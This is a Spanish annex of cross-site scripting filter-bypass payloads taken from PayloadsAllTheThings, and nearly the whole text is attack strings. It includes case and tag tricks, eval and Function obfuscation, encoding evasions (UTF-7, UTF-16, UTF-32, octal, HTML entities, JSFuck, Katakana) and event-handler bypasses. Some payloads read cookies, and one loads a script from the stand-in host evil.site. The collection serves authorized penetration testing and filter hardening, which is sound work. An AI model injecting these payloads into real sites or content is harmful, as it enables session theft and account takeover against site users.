# Cross-Site Scripting (XSS): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [XSS Injection/1 - XSS Filter Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. XSS Evasión de filtros / Evasión Case Sensitive

```javascript
<sCrIpt>alert(1)</ScRipt>
<ScrIPt>alert(1)</ScRipT>
```

## 2. XSS Evasión de filtros / Evasión Tag Blacklist

```javascript
<script x>
<script x>alert('XSS')<script y>
```

## 3. XSS Evasión de filtros / Evasión Word Blacklist Con Code Evaluation

````javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
````

## 4. XSS Evasión de filtros / Evasión Con Incomplete HTML Tag

```javascript
<img src='1' onerror='alert(0)' <
```

## 5. XSS Evasión de filtros / Evasión Quotes for String

```javascript
String.fromCharCode(88,83,83)
```

## 6. XSS Evasión de filtros / Evasión Quotes in Script Tag

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

## 7. XSS Evasión de filtros / Evasión Quotes in Mousedown Event

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

## 8. XSS Evasión de filtros / Evasión Dot Filter

```javascript
<script>window['alert'](document['domain'])</script>
```

```javascript
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

### Variantes presentes en tablas o texto del apartado

```text
http://192.168.1.1
http://3232235777
echo -n "alert(document.cookie)" | base64
YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
```

## 9. XSS Evasión de filtros / Evasión Parenthesis for String

```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

## 10. XSS Evasión de filtros / Evasión Parenthesis and Semi Colon

```javascript
    <script>onerror=alert;throw 1337</script>
    <script>{onerror=alert}throw 1337</script>
    <script>throw onerror=alert,'some string',123,'haha'</script>
```

```js
    <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
```

```js
    <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

## 11. XSS Evasión de filtros / Evasión onxxxx Blacklist

```html
    <object onafterscriptexecute=confirm(0)>
    <object onbeforescriptexecute=confirm(0)>
```

```html
    <img src='1' onerror\x00=alert(0) />
    <img src='1' onerror\x0b=alert(0) />
    <img src='1' onerror\x0d=alert(0) />
    <img src='1' onerror\x0a=alert(0) />
```

```js
    <img src='1' onerror/=alert(0) />
```

## 12. XSS Evasión de filtros / Evasión Space Filter

```javascript
    <img/src='1'/onerror=alert(0)>
```

```html
  <svgonload=alert(1)>
```

```ps1
$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```

### Variantes presentes en tablas o texto del apartado

```text
0x0c/^L
0x0d/^M
0x0a/^J
0x09/^I
```

## 13. XSS Evasión de filtros / Evasión Email Filter

```javascript
  "><svg/onload=confirm(1)>"@x.y
```

```javascript
  xss@example.com(<img src='x' onerror='alert(document.location)'>)
```

## 14. XSS Evasión de filtros / Evasión Tel URI Filter

```javascript
+330011223344;phone-context=<script>alert(0)</script>
```

### Variantes presentes en tablas o texto del apartado

```text
;phone-context=
```

## 15. XSS Evasión de filtros / Evasión Document Blacklist

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
window["doc"+"ument"]
```

## 16. XSS Evasión de filtros / Evasión document.Cookie Blacklist

```js
window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
```

## 17. XSS Evasión de filtros / Evasión Usando Javascript Inside a String

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

## 18. XSS Evasión de filtros / Evasión Usando an Alternate Way to Redirect

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

## 19. XSS Evasión de filtros / Evasión Usando an Alternate Way to Execute an Alert

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
```

```javascript
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
```

```javascript
//bind function alert on new function a()
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} 

// then you can use a() with Object.keys
self[Object.keys(self)[a()]]("1") // alert("1")
```

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

````javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
````

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

## 20. XSS Evasión de filtros / Evasión ">" Usando Nothing

```javascript
<svg onload=alert(1)//
```

## 21. XSS Evasión de filtros / Evasión "<" and ">" Usando ＜ and ＞

```javascript
＜script/src=//evil.site/poc.js＞
```

### Variantes presentes en tablas o texto del apartado

```text
U+FF1C
U+FF1E
```

## 22. XSS Evasión de filtros / Evasión ";" Usando Another Character

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

## 23. XSS Evasión de filtros / Evasión Usando Missing Charset Cabecera

### Variantes presentes en tablas o texto del apartado

```text
Content-Type: text/html
```

## 24. Evasión Usando Missing Charset Cabecera / ISO-2022-JP

### Variantes presentes en tablas o texto del apartado

```text
\x1B (B
\x1B (J
\x1B $@
\x1B $B
\
%1b(J
\'
¥'
search=%1b(J&lang=en";alert(1)//
```

## 25. XSS Evasión de filtros / Evasión Usando HTML Codificación

```javascript
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

## 26. XSS Evasión de filtros / Evasión Usando Katakana

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```

## 27. XSS Evasión de filtros / Evasión Usando Cuneiform

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

## 28. XSS Evasión de filtros / Evasión Usando Lontara

```javascript
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
```

## 29. XSS Evasión de filtros / Evasión Usando ECMAScript6

```html
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
```

## 30. XSS Evasión de filtros / Evasión Usando Octal Codificación

```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

## 31. XSS Evasión de filtros / Evasión Usando Unicode

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
```

```javascript
%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
```

```html
<ſvg onload=... >
<ıframe id=x onload=>
```

### Variantes presentes en tablas o texto del apartado

```text
\u0061
\u006C
\u0065
\u0072
\u0074
\uFF1C
\uFF1E
\u02BA
\u02B9
ʺ＞＜svg onload=alert(/XSS/)＞/
toLowerCase()
toUpperCase()
```

## 32. XSS Evasión de filtros / Evasión Usando UTF-7

```javascript
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

## 33. XSS Evasión de filtros / Evasión Usando UTF-8

```javascript
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
```

## 34. XSS Evasión de filtros / Evasión Usando UTF-16be

```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

## 35. XSS Evasión de filtros / Evasión Usando UTF-32

```js
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

## 36. XSS Evasión de filtros / Evasión Usando BOM

```js
BOM Character for UTF-16 Encoding:
Big Endian : 0xFE 0xFF
Little Endian : 0xFF 0xFE
XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

BOM Character for UTF-32 Encoding:
Big Endian : 0x00 0x00 0xFE 0xFF
Little Endian : 0xFF 0xFE 0x00 0x00
XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

## 37. XSS Evasión de filtros / Evasión Usando JSfuck

```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
